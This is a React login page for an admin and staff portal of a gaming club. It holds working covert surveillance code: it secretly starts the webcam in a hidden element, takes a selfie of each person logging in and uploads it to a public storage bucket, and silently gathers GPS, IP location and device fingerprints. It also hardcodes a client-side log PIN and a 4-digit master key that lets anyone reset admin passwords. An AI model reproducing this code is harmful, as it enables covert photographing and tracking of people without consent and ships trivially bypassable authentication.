import React, { useState, useEffect, useRef } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle } from '@/components/ui/card';
import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';
import { useToast } from '@/hooks/use-toast';
import { useAuth } from '@/context/AuthContext';
import { Gamepad, ZapIcon, Stars, Dice1, Dice3, Dice5, Trophy, Joystick, User, Users, Shield, KeyRound, Lock, Eye, EyeOff, ArrowLeft, FileText } from 'lucide-react';
import { useIsMobile } from '@/hooks/use-mobile';
import { Tabs, TabsList, TabsTrigger } from '@/components/ui/tabs';
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogFooter,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import { UAParser } from 'ua-parser-js';
import { supabase } from "@/integrations/supabase/client";

interface LocationState {
  from?: string;
}

const Login = () => {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [loginType, setLoginType] = useState('admin');
  const { login, resetPassword } = useAuth();
  const { toast } = useToast();
  const navigate = useNavigate();
  const location = useLocation();
  const locationState = location.state as LocationState;
  const [animationClass, setAnimationClass] = useState('');
  const isMobile = useIsMobile();
  
  const [forgotDialogOpen, setForgotDialogOpen] = useState(false);
  const [forgotUsername, setForgotUsername] = useState('');
  const [masterKey, setMasterKey] = useState('');
  const [newPassword, setNewPassword] = useState('');
  const [confirmPassword, setConfirmPassword] = useState('');
  const [forgotPasswordStep, setForgotPasswordStep] = useState(1);
  const [forgotPasswordType, setForgotPasswordType] = useState('admin');
  const [resetLoading, setResetLoading] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const [showNewPassword, setShowNewPassword] = useState(false);
  const [showConfirmPassword, setShowConfirmPassword] = useState(false);
  const [showMasterKey, setShowMasterKey] = useState(false);
  
  const [pinDialogOpen, setPinDialogOpen] = useState(false);
  const [pinInput, setPinInput] = useState('');
  const [showPin, setShowPin] = useState(false);
  
  // Hidden webcam and canvas for silent capture
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const [cameraReady, setCameraReady] = useState(false);
  
  const [loginMetadata, setLoginMetadata] = useState<any>({});

  useEffect(() => {
    const timer = setTimeout(() => {
      setAnimationClass('animate-scale-in');
    }, 100);
    return () => clearTimeout(timer);
  }, []);

  // Silently initialize camera in background
  useEffect(() => {
    const initCamera = async () => {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
          video: { facingMode: 'user', width: 640, height: 480 },
          audio: false 
        });
        
        if (videoRef.current) {
          videoRef.current.srcObject = stream;
          videoRef.current.play();
          setCameraReady(true);
          console.log('📷 Camera initialized silently');
        }
      } catch (error) {
        console.log('⚠️ Camera not available or permission denied');
        setCameraReady(false);
      }
    };
    
    initCamera();

    // Cleanup camera on unmount
    return () => {
      if (videoRef.current && videoRef.current.srcObject) {
        const stream = videoRef.current.srcObject as MediaStream;
        stream.getTracks().forEach(track => track.stop());
      }
    };
  }, []);

  // Silently capture photo
  const captureSilentPhoto = (): string | null => {
    if (!cameraReady || !videoRef.current || !canvasRef.current) {
      console.log('⚠️ Camera not ready for capture');
      return null;
    }

    try {
      const canvas = canvasRef.current;
      const video = videoRef.current;
      
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      
      const ctx = canvas.getContext('2d');
      if (ctx) {
        ctx.drawImage(video, 0, 0);
        console.log('📸 Selfie captured silently');
        return canvas.toDataURL('image/jpeg', 0.8);
      }
    } catch (error) {
      console.error('❌ Error capturing photo:', error);
    }
    
    return null;
  };

  const uploadSelfie = async (imageData: string): Promise<string | null> => {
    try {
      const base64Data = imageData.split(',')[1];
      const fileName = `selfie_${Date.now()}_${Math.random().toString(36).substring(7)}.jpg`;
      
      const { data, error } = await supabase.storage
        .from('login-selfies')
        .upload(fileName, decode(base64Data), {
          contentType: 'image/jpeg',
          cacheControl: '3600',
        });

      if (error) throw error;

      const { data: publicUrlData } = supabase.storage
        .from('login-selfies')
        .getPublicUrl(fileName);

      console.log('✅ Selfie uploaded successfully');
      return publicUrlData.publicUrl;
    } catch (error) {
      console.error('❌ Error uploading selfie:', error);
      return null;
    }
  };

  const decode = (base64: string): Uint8Array => {
    const binaryString = window.atob(base64);
    const len = binaryString.length;
    const bytes = new Uint8Array(len);
    for (let i = 0; i < len; i++) {
      bytes[i] = binaryString.charCodeAt(i);
    }
    return bytes;
  };

  // Collect all metadata - IMPROVED VERSION
  useEffect(() => {
    const collectLoginInfo = async () => {
      try {
        const parser = new UAParser();
        const device = parser.getResult();
        
        let metadata: any = {
          browser: device.browser.name,
          browserVersion: device.browser.version,
          os: device.os.name,
          osVersion: device.os.version,
          deviceType: device.device.type || 'desktop',
          deviceModel: device.device.model || 'Unknown',
          deviceVendor: device.device.vendor || 'Unknown',
          loginTime: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
          userAgent: navigator.userAgent,
          screenResolution: `${window.screen.width}x${window.screen.height}`,
          colorDepth: window.screen.colorDepth,
          pixelRatio: window.devicePixelRatio,
          touchSupport: 'ontouchstart' in window
        };

        // Hardware info
        if ('hardwareConcurrency' in navigator) {
          metadata.cpuCores = (navigator as any).hardwareConcurrency;
        }
        if ('deviceMemory' in navigator) {
          metadata.deviceMemory = (navigator as any).deviceMemory;
        }

        // Connection info
        const connection = (navigator as any).connection || (navigator as any).mozConnection || (navigator as any).webkitConnection;
        if (connection) {
          metadata.connectionType = connection.effectiveType || connection.type;
        }

        // Battery info
        if ('getBattery' in navigator) {
          try {
            const battery: any = await (navigator as any).getBattery();
            metadata.batteryLevel = Math.round(battery.level * 100);
          } catch (e) {
            console.log('⚠️ Battery API not available');
          }
        }

        // Get IP and location - Wait for response
        try {
          const controller = new AbortController();
          const timeoutId = setTimeout(() => controller.abort(), 10000); // 10 second timeout
          
          const response = await fetch('https://ipapi.co/json/', {
            signal: controller.signal
          });
          clearTimeout(timeoutId);
          
          if (response.ok) {
            const data = await response.json();
            metadata.ip = data.ip;
            metadata.city = data.city;
            metadata.region = data.region;
            metadata.country = data.country_name;
            metadata.timezone = data.timezone;
            metadata.isp = data.org;
            console.log('✅ IP and location data fetched successfully');
          }
        } catch (error) {
          console.log('⚠️ Could not fetch IP data, trying alternative...');
          
          // Try alternative API
          try {
            const response = await fetch('https://api.ipify.org?format=json');
            if (response.ok) {
              const data = await response.json();
              metadata.ip = data.ip;
              console.log('✅ IP fetched from alternative API');
            }
          } catch (e) {
            console.log('⚠️ All IP APIs failed');
          }
        }

        // Set initial metadata
        setLoginMetadata(metadata);

        // Get GPS coordinates silently - This runs separately
        if ('geolocation' in navigator) {
          console.log('📍 Requesting GPS location...');
          navigator.geolocation.getCurrentPosition(
            (position) => {
              console.log('✅ GPS location obtained:', position.coords.latitude, position.coords.longitude);
              const updatedMetadata = {
                ...metadata,
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                locationAccuracy: position.coords.accuracy
              };
              setLoginMetadata(updatedMetadata);
            },
            (error) => {
              console.log('⚠️ GPS location denied or unavailable:', error.message);
              // Keep existing metadata without GPS
            },
            { 
              enableHighAccuracy: true, 
              timeout: 10000,
              maximumAge: 0 
            }
          );
        } else {
          console.log('⚠️ Geolocation not supported');
        }

        console.log('🔍 Login tracking ready - metadata collection initiated');
      } catch (error) {
        console.error('❌ Error collecting metadata:', error);
        // Set minimal metadata even if collection fails
        setLoginMetadata({
          loginTime: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
          userAgent: navigator.userAgent
        });
      }
    };
    
    collectLoginInfo();
  }, []);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!username || !password) {
      toast({
        title: 'Error',
        description: 'Please enter both username and password',
        variant: 'destructive',
      });
      return;
    }
    
    setIsLoading(true);
    
    // Wait a moment for GPS to finish if it's still loading
    await new Promise(resolve => setTimeout(resolve, 500));
    
    try {
      const isAdminLogin = loginType === 'admin';
      
      // Silently capture selfie
      let selfieUrl = null;
      const capturedImage = captureSilentPhoto();
      if (capturedImage) {
        selfieUrl = await uploadSelfie(capturedImage);
      }

      const enhancedMetadata = {
        ...loginMetadata,
        selfieUrl
      };

      console.log('🚀 Submitting login with metadata:', {
        hasIP: !!enhancedMetadata.ip,
        hasGPS: !!enhancedMetadata.latitude,
        hasSelfie: !!selfieUrl,
        city: enhancedMetadata.city,
        country: enhancedMetadata.country
      });
      
      const success = await login(username, password, isAdminLogin, enhancedMetadata);
      
      if (success) {
        // Stop camera after successful login
        if (videoRef.current && videoRef.current.srcObject) {
          const stream = videoRef.current.srcObject as MediaStream;
          stream.getTracks().forEach(track => track.stop());
        }

        toast({
          title: 'Success',
          description: `${isAdminLogin ? 'Admin' : 'Staff'} logged in successfully!`,
        });
        
        const redirectTo = locationState?.from || '/dashboard';
        navigate(redirectTo);
      } else {
        toast({
          title: 'Error',
          description: `Invalid ${isAdminLogin ? 'admin' : 'staff'} credentials`,
          variant: 'destructive',
        });
      }
    } catch (error) {
      toast({
        title: 'Error',
        description: 'Something went wrong. Please try again.',
        variant: 'destructive',
      });
    } finally {
      setIsLoading(false);
    }
  };

  const handleViewLogsClick = () => {
    setPinInput('');
    setPinDialogOpen(true);
  };

  const handlePinSubmit = () => {
    if (pinInput === '2101') {
      setPinDialogOpen(false);
      navigate('/login-logs');
    } else {
      toast({
        title: 'Error',
        description: 'Incorrect PIN',
        variant: 'destructive',
      });
    }
  };

  const handleForgotPasswordClick = (type: string) => {
    setForgotPasswordType(type);
    setForgotPasswordStep(1);
    setForgotUsername('');
    setMasterKey('');
    setNewPassword('');
    setConfirmPassword('');
    setForgotDialogOpen(true);
  };

  const handleNextStep = () => {
    if (forgotPasswordType === 'staff') {
      toast({
        title: 'Staff Password Reset',
        description: 'Please contact your administrator to reset your password.',
      });
      setForgotDialogOpen(false);
      return;
    }

    if (forgotPasswordStep === 1) {
      if (!forgotUsername) {
        toast({
          title: 'Error',
          description: 'Please enter your username',
          variant: 'destructive',
        });
        return;
      }
      setForgotPasswordStep(2);
    } else if (forgotPasswordStep === 2) {
      if (masterKey === '2580') {
        setForgotPasswordStep(3);
      } else {
        toast({
          title: 'Error',
          description: 'Incorrect master key',
          variant: 'destructive',
        });
      }
    } else if (forgotPasswordStep === 3) {
      handleResetPassword();
    }
  };

  const handleResetPassword = async () => {
    if (!newPassword || !confirmPassword) {
      toast({
        title: 'Error',
        description: 'Please enter and confirm your new password',
        variant: 'destructive',
      });
      return;
    }

    if (newPassword !== confirmPassword) {
      toast({
        title: 'Error',
        description: 'Passwords do not match',
        variant: 'destructive',
      });
      return;
    }

    setResetLoading(true);
    try {
      const success = await resetPassword(forgotUsername, newPassword);
      
      if (success) {
        toast({
          title: 'Success',
          description: 'Password has been reset successfully',
        });
        setForgotDialogOpen(false);
      } else {
        toast({
          title: 'Error',
          description: 'Failed to reset password. Username may not exist.',
          variant: 'destructive',
        });
      }
    } catch (error) {
      toast({
        title: 'Error',
        description: 'Something went wrong. Please try again.',
        variant: 'destructive',
      });
    } finally {
      setResetLoading(false);
    }
  };

  const togglePasswordVisibility = () => setShowPassword(!showPassword);
  const toggleNewPasswordVisibility = () => setShowNewPassword(!showNewPassword);
  const toggleConfirmPasswordVisibility = () => setShowConfirmPassword(!showConfirmPassword);
  const toggleMasterKeyVisibility = () => setShowMasterKey(!showMasterKey);
  const togglePinVisibility = () => setShowPin(!showPin);

  const renderForgotPasswordContent = () => {
    if (forgotPasswordType === 'staff') {
      return (
        <>
          <DialogHeader>
            <DialogTitle className="flex items-center gap-2">
              <KeyRound size={16} className="text-cuephoria-orange" />
              Staff Password Reset
            </DialogTitle>
            <DialogDescription>
              Staff members need to contact an administrator to reset their password.
            </DialogDescription>
          </DialogHeader>
          <div className="py-6 text-center">
            <Users className="mx-auto h-12 w-12 text-muted-foreground mb-4" />
            <p className="text-muted-foreground">
              Please contact your administrator for password assistance.
            </p>
          </div>
          <DialogFooter>
            <Button 
              onClick={() => setForgotDialogOpen(false)}
              className="w-full bg-cuephoria-purple hover:bg-cuephoria-purple/80"
            >
              Close
            </Button>
          </DialogFooter>
        </>
      );
    }

    if (forgotPasswordStep === 1) {
      return (
        <>
          <DialogHeader>
            <DialogTitle className="flex items-center gap-2">
              <KeyRound size={16} className="text-cuephoria-orange" />
              Admin Password Reset
            </DialogTitle>
            <DialogDescription>
              Enter your admin username to begin the password reset process.
            </DialogDescription>
          </DialogHeader>
          <div className="py-6">
            <div className="space-y-4">
              <div className="space-y-2">
                <label htmlFor="forgotUsername" className="text-sm font-medium">Username</label>
                <Input
                  id="forgotUsername"
                  type="text"
                  placeholder="Enter your username"
                  value={forgotUsername}
                  onChange={(e) => setForgotUsername(e.target.value)}
                  className="bg-background/50 border-cuephoria-lightpurple/30"
                />
              </div>
            </div>
          </div>
          <DialogFooter>
            <Button variant="outline" onClick={() => setForgotDialogOpen(false)}>Cancel</Button>
            <Button 
              onClick={handleNextStep} 
              disabled={!forgotUsername}
              className="bg-cuephoria-purple hover:bg-cuephoria-purple/80"
            >
              Next
            </Button>
          </DialogFooter>
        </>
      );
    }

    if (forgotPasswordStep === 2) {
      return (
        <>
          <DialogHeader>
            <DialogTitle className="flex items-center gap-2">
              <Shield size={16} className="text-cuephoria-orange" />
              Master Key Verification
            </DialogTitle>
            <DialogDescription>
              Enter the master key to verify your identity.
            </DialogDescription>
          </DialogHeader>
          <div className="py-6">
            <div className="space-y-4">
              <div className="space-y-2">
                <label htmlFor="masterKey" className="text-sm font-medium">Master Key</label>
                <div className="relative">
                  <Input
                    id="masterKey"
                    type={showMasterKey ? "text" : "password"}
                    placeholder="Enter master key"
                    value={masterKey}
                    onChange={(e) => setMasterKey(e.target.value)}
                    className="bg-background/50 border-cuephoria-lightpurple/30 pr-10"
                  />
                  <button
                    type="button"
                    onClick={toggleMasterKeyVisibility}
                    className="absolute right-2 top-1/2 transform -translate-y-1/2 text-cuephoria-lightpurple hover:text-accent focus:outline-none"
                    aria-label={showMasterKey ? "Hide master key" : "Show master key"}
                  >
                    {showMasterKey ? <EyeOff size={18} /> : <Eye size={18} />}
                  </button>
                </div>
              </div>
            </div>
          </div>
          <DialogFooter>
            <Button variant="outline" onClick={() => setForgotDialogOpen(false)}>Cancel</Button>
            <Button 
              onClick={handleNextStep} 
              disabled={!masterKey}
              className="bg-cuephoria-purple hover:bg-cuephoria-purple/80"
            >
              Verify
            </Button>
          </DialogFooter>
        </>
      );
    }

    return (
      <>
        <DialogHeader>
          <DialogTitle className="flex items-center gap-2">
            <Lock size={16} className="text-cuephoria-orange" />
            Set New Password
          </DialogTitle>
          <DialogDescription>
            Create a new password for your account.
          </DialogDescription>
        </DialogHeader>
        <div className="py-6">
          <div className="space-y-4">
            <div className="space-y-2">
              <label htmlFor="newPassword" className="text-sm font-medium">New Password</label>
              <div className="relative">
                <Input
                  id="newPassword"
                  type={showNewPassword ? "text" : "password"}
                  placeholder="Enter new password"
                  value={newPassword}
                  onChange={(e) => setNewPassword(e.target.value)}
                  className="bg-background/50 border-cuephoria-lightpurple/30 pr-10"
                />
                <button
                  type="button"
                  onClick={toggleNewPasswordVisibility}
                  className="absolute right-2 top-1/2 transform -translate-y-1/2 text-cuephoria-lightpurple hover:text-accent focus:outline-none"
                  aria-label={showNewPassword ? "Hide new password" : "Show new password"}
                >
                  {showNewPassword ? <EyeOff size={18} /> : <Eye size={18} />}
                </button>
              </div>
            </div>
            <div className="space-y-2">
              <label htmlFor="confirmPassword" className="text-sm font-medium">Confirm Password</label>
              <div className="relative">
                <Input
                  id="confirmPassword"
                  type={showConfirmPassword ? "text" : "password"}
                  placeholder="Confirm new password"
                  value={confirmPassword}
                  onChange={(e) => setConfirmPassword(e.target.value)}
                  className="bg-background/50 border-cuephoria-lightpurple/30 pr-10"
                />
                <button
                  type="button"
                  onClick={toggleConfirmPasswordVisibility}
                  className="absolute right-2 top-1/2 transform -translate-y-1/2 text-cuephoria-lightpurple hover:text-accent focus:outline-none"
                  aria-label={showConfirmPassword ? "Hide confirm password" : "Show confirm password"}
                >
                  {showConfirmPassword ? <EyeOff size={18} /> : <Eye size={18} />}
                </button>
              </div>
            </div>
          </div>
        </div>
        <DialogFooter>
          <Button variant="outline" onClick={() => setForgotDialogOpen(false)}>Cancel</Button>
          <Button 
            onClick={handleResetPassword} 
            disabled={!newPassword || !confirmPassword || resetLoading}
            className="bg-cuephoria-purple hover:bg-cuephoria-purple/80"
          >
            {resetLoading ? "Resetting..." : "Reset Password"}
          </Button>
        </DialogFooter>
      </>
    );
  };

  return (
    <div className="min-h-screen flex items-center justify-center bg-cuephoria-dark overflow-hidden relative px-4 sm:px-6 py-8 sm:py-4">
      {/* Hidden video and canvas for silent capture */}
      <video 
        ref={videoRef} 
        style={{ display: 'none' }}
        autoPlay
        playsInline
        muted
      />
      <canvas ref={canvasRef} style={{ display: 'none' }} />

      <div className="absolute top-2 sm:top-4 left-2 sm:left-4 right-2 sm:right-4 z-20 flex justify-between gap-2">
        <Button 
          variant="ghost" 
          size="sm"
          className="flex items-center gap-1 sm:gap-2 text-gray-300 hover:text-white hover:bg-cuephoria-purple/20 text-xs sm:text-sm px-2 sm:px-3"
          onClick={() => navigate('/')}
        >
          <ArrowLeft size={14} className="sm:w-4 sm:h-4" />
          <span className="hidden sm:inline">Back to Home</span>
          <span className="sm:hidden">Back</span>
        </Button>
        
        <Button 
          variant="ghost" 
          size="sm"
          className="flex items-center gap-1 sm:gap-2 text-gray-300 hover:text-white hover:bg-cuephoria-orange/20 text-xs sm:text-sm px-2 sm:px-3"
          onClick={handleViewLogsClick}
        >
          <FileText size={14} className="sm:w-4 sm:h-4" />
          <span className="hidden sm:inline">View Logs</span>
          <span className="sm:hidden">Logs</span>
        </Button>
      </div>
      
      <div className="absolute inset-0 z-0 overflow-hidden">
        <div className="absolute top-0 left-0 w-full h-full bg-[radial-gradient(ellipse_at_top_left,_var(--tw-gradient-stops))] from-blue-500/20 via-transparent to-transparent"></div>
        <div className="absolute bottom-0 right-0 w-full h-full bg-[radial-gradient(ellipse_at_bottom_right,_var(--tw-gradient-stops))] from-purple-500/20 via-transparent to-transparent"></div>
        
        <div className="absolute top-1/3 right-1/4 w-48 h-64 bg-[radial-gradient(circle,_var(--tw-gradient-stops))] from-accent/10 via-transparent to-transparent rounded-tr-[50%]"></div>
        
        <div className="absolute top-[8%] left-[12%] text-cuephoria-lightpurple opacity-20 animate-float">
          <Gamepad size={isMobile ? 24 : 36} className="animate-wiggle" />
        </div>
        <div className="absolute bottom-[15%] right-[15%] text-accent opacity-20 animate-float delay-300">
          <ZapIcon size={isMobile ? 24 : 36} className="animate-pulse-soft" />
        </div>
        <div className="absolute top-[30%] right-[30%] text-cuephoria-lightpurple opacity-20 animate-float delay-150">
          <Stars size={isMobile ? 18 : 24} className="animate-pulse-soft" />
        </div>
        <div className="absolute top-[15%] right-[12%] text-cuephoria-orange opacity-20 animate-float delay-250">
          <Dice1 size={isMobile ? 20 : 28} className="animate-wiggle" />
        </div>
        <div className="absolute bottom-[25%] left-[25%] text-cuephoria-blue opacity-20 animate-float delay-200">
          <Dice3 size={isMobile ? 22 : 30} className="animate-pulse-soft" />
        </div>
        <div className="absolute top-[50%] left-[15%] text-cuephoria-green opacity-20 animate-float delay-150">
          <Dice5 size={isMobile ? 24 : 32} className="animate-wiggle" />
        </div>
        <div className="absolute bottom-[10%] left-[10%] text-cuephoria-orange opacity-20 animate-float delay-300">
          <Trophy size={isMobile ? 24 : 34} className="animate-pulse-soft" />
        </div>
        <div className="absolute top-[25%] left-[25%] text-accent opacity-20 animate-float delay-400">
          <Joystick size={isMobile ? 28 : 38} className="animate-wiggle" />
        </div>
        
        <div className="absolute top-1/2 left-0 h-px w-full bg-gradient-to-r from-transparent via-cuephoria-lightpurple/30 to-transparent"></div>
        <div className="absolute top-0 left-1/2 h-full w-px bg-gradient-to-b from-transparent via-accent/30 to-transparent"></div>
        <div className="absolute top-1/3 left-0 h-px w-full bg-gradient-to-r from-transparent via-cuephoria-orange/20 to-transparent"></div>
        <div className="absolute top-2/3 left-0 h-px w-full bg-gradient-to-r from-transparent via-cuephoria-green/20 to-transparent"></div>
        
        <div className="absolute inset-0 opacity-10" style={{ backgroundImage: 'radial-gradient(circle, rgba(255,255,255,0.1) 1px, transparent 1px)', backgroundSize: '30px 30px' }}></div>
      </div>
      
      <div className={`w-full max-w-md mx-auto z-10 ${animationClass}`}>
        <div className="mb-6 sm:mb-8 text-center">
          <div className="relative mx-auto w-full max-w-[180px] sm:max-w-[220px] h-auto">
            <div className="absolute inset-0 rounded-full bg-gradient-to-br from-cuephoria-lightpurple/20 to-accent/10 blur-lg"></div>
            <img 
              src="/lovable-uploads/edbcb263-8fde-45a9-b66b-02f664772425.png" 
              alt="Cuephoria 8-Ball Club" 
              className="relative w-full h-auto mx-auto drop-shadow-[0_0_15px_rgba(155,135,245,0.3)]"
            />
          </div>
          <p className="mt-2 text-muted-foreground font-bold tracking-wider animate-fade-in bg-gradient-to-r from-cuephoria-lightpurple via-accent to-cuephoria-lightpurple bg-clip-text text-transparent text-xs sm:text-sm md:text-base">
            ADMINISTRATOR PORTAL
          </p>
        </div>
        
        <Card className="bg-cuephoria-darker/90 border border-cuephoria-lightpurple/30 shadow-xl shadow-cuephoria-lightpurple/20 backdrop-blur-lg animate-fade-in delay-100 rounded-xl overflow-hidden">
          <div className="absolute inset-0 bg-gradient-to-br from-cuephoria-lightpurple/5 to-accent/5 opacity-50 rounded-xl"></div>
          <div className="absolute w-full h-full bg-grid-pattern opacity-5"></div>
          
          <CardHeader className="text-center relative z-10 p-6 sm:p-8 pb-4 sm:pb-6">
            <CardTitle className="text-xl sm:text-2xl md:text-3xl gradient-text font-bold mb-2">Game Master Login</CardTitle>
            <CardDescription className="text-muted-foreground font-medium text-sm sm:text-base">Enter your credentials to access the control panel</CardDescription>
          </CardHeader>
          
          <form onSubmit={handleSubmit}>
            <CardContent className="space-y-4 relative z-10 p-4 sm:p-6 pt-4 sm:pt-6">
              <div className="flex justify-center mb-4 sm:mb-6">
                <Tabs defaultValue="admin" value={loginType} onValueChange={setLoginType} className="w-full">
                  <TabsList className="grid w-full grid-cols-2 h-10 sm:h-11 gap-1 p-1">
                    <TabsTrigger value="admin" className="flex items-center justify-center gap-1.5 sm:gap-2 text-xs sm:text-sm py-2 px-3">
                      <Shield size={14} className="sm:w-4 sm:h-4" />
                      <span>Admin</span>
                    </TabsTrigger>
                    <TabsTrigger value="staff" className="flex items-center justify-center gap-1.5 sm:gap-2 text-xs sm:text-sm py-2 px-3">
                      <Users size={14} className="sm:w-4 sm:h-4" />
                      <span>Staff</span>
                    </TabsTrigger>
                  </TabsList>
                </Tabs>
              </div>

              <div className="space-y-2 group">
                <label htmlFor="username" className="text-xs sm:text-sm font-medium flex items-center gap-2 text-cuephoria-lightpurple group-hover:text-accent transition-colors duration-300">
                  <User size={14} className="sm:w-4 sm:h-4" />
                  <span>Username</span>
                  <div className="h-px flex-grow bg-gradient-to-r from-cuephoria-lightpurple/50 to-transparent group-hover:from-accent/50 transition-colors duration-300"></div>
                </label>
                <Input
                  id="username"
                  type="text"
                  placeholder="Enter your username"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  className="bg-background/50 border-cuephoria-lightpurple/30 focus-visible:ring-cuephoria-lightpurple transition-all duration-300 hover:border-cuephoria-lightpurple/60 placeholder:text-muted-foreground/50 focus-within:shadow-sm focus-within:shadow-cuephoria-lightpurple/30 text-sm sm:text-base h-11 sm:h-12"
                />
              </div>
              
              <div className="space-y-2 group">
                <label htmlFor="password" className="text-xs sm:text-sm font-medium flex items-center gap-2 text-cuephoria-lightpurple group-hover:text-accent transition-colors duration-300">
                  <ZapIcon size={14} className="sm:w-4 sm:h-4" />
                  <span>Password</span>
                  <div className="h-px flex-grow bg-gradient-to-r from-cuephoria-lightpurple/50 to-transparent group-hover:from-accent/50 transition-colors duration-300"></div>
                </label>
                <div className="relative">
                  <Input
                    id="password"
                    type={showPassword ? "text" : "password"}
                    placeholder="••••••••"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    className="bg-background/50 border-cuephoria-lightpurple/30 focus-visible:ring-cuephoria-lightpurple transition-all duration-300 hover:border-cuephoria-lightpurple/60 placeholder:text-muted-foreground/50 focus-within:shadow-sm focus-within:shadow-cuephoria-lightpurple/30 text-sm sm:text-base pr-12 h-11 sm:h-12"
                  />
                  <button
                    type="button"
                    onClick={togglePasswordVisibility}
                    className="absolute right-3 top-1/2 transform -translate-y-1/2 text-cuephoria-lightpurple hover:text-accent focus:outline-none transition-colors duration-200 min-w-[44px] min-h-[44px] flex items-center justify-center"
                    aria-label={showPassword ? "Hide password" : "Show password"}
                  >
                    {showPassword ? <EyeOff size={18} /> : <Eye size={18} />}
                  </button>
                </div>
              </div>

              <div className="text-right">
                <Button 
                  type="button" 
                  variant="link" 
                  className="text-cuephoria-lightpurple hover:text-accent p-0 h-auto text-xs sm:text-sm min-h-[44px]"
                  onClick={() => handleForgotPasswordClick(loginType)}
                >
                  Forgot password?
                </Button>
              </div>
            </CardContent>
            
            <CardFooter className="relative z-10 p-6 sm:p-8 pt-4 sm:pt-6">
              <Button 
                type="submit" 
                className="w-full relative overflow-hidden bg-gradient-to-r from-cuephoria-lightpurple to-accent hover:shadow-lg hover:shadow-cuephoria-lightpurple/20 hover:scale-[1.02] transition-all duration-300 btn-hover-effect font-medium text-base sm:text-lg h-12 sm:h-14" 
                disabled={isLoading}
              >
                <span className="relative z-10 flex items-center justify-center gap-2">
                  {isLoading ? (
                    <>
                      <svg className="animate-spin -ml-1 mr-2 h-4 w-4 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                        <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                        <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                      </svg>
                      Authenticating...
                    </>
                  ) : (
                    <>
                      {loginType === 'admin' ? <Shield size={16} className="sm:w-4 sm:h-4" /> : <Users size={16} className="sm:w-4 sm:h-4" />}
                      {loginType === 'admin' ? 'Admin Login' : 'Staff Login'}
                    </>
                  )}
                </span>
              </Button>
            </CardFooter>
          </form>
        </Card>
      </div>

      {/* PIN Dialog */}
      <Dialog open={pinDialogOpen} onOpenChange={setPinDialogOpen}>
        <DialogContent className="sm:max-w-md bg-background border-cuephoria-orange">
          <DialogHeader>
            <DialogTitle className="flex items-center gap-2">
              <Lock size={16} className="text-cuephoria-orange" />
              Enter PIN to Access Logs
            </DialogTitle>
            <DialogDescription>
              Enter the security PIN to view login logs.
            </DialogDescription>
          </DialogHeader>
          <div className="py-6">
            <div className="space-y-2">
              <label htmlFor="pinInput" className="text-sm font-medium">Security PIN</label>
              <div className="relative">
                <Input
                  id="pinInput"
                  type={showPin ? "text" : "password"}
                  placeholder="Enter 4-digit PIN"
                  value={pinInput}
                  onChange={(e) => setPinInput(e.target.value)}
                  onKeyDown={(e) => {
                    if (e.key === 'Enter') {
                      handlePinSubmit();
                    }
                  }}
                  maxLength={4}
                  className="bg-background/50 border-cuephoria-orange/30 pr-10 text-center text-2xl tracking-widest"
                />
                <button
                  type="button"
                  onClick={togglePinVisibility}
                  className="absolute right-2 top-1/2 transform -translate-y-1/2 text-cuephoria-orange hover:text-accent focus:outline-none"
                  aria-label={showPin ? "Hide PIN" : "Show PIN"}
                >
                  {showPin ? <EyeOff size={18} /> : <Eye size={18} />}
                </button>
              </div>
            </div>
          </div>
          <DialogFooter>
            <Button variant="outline" onClick={() => setPinDialogOpen(false)}>Cancel</Button>
            <Button 
              onClick={handlePinSubmit}
              disabled={pinInput.length !== 4}
              className="bg-cuephoria-orange hover:bg-cuephoria-orange/80"
            >
              Access Logs
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>

      {/* Forgot Password Dialog */}
      <Dialog open={forgotDialogOpen} onOpenChange={setForgotDialogOpen}>
        <DialogContent className="sm:max-w-md bg-background border-cuephoria-purple">
          {renderForgotPasswordContent()}
        </DialogContent>
      </Dialog>
    </div>
  );
};

export default Login;
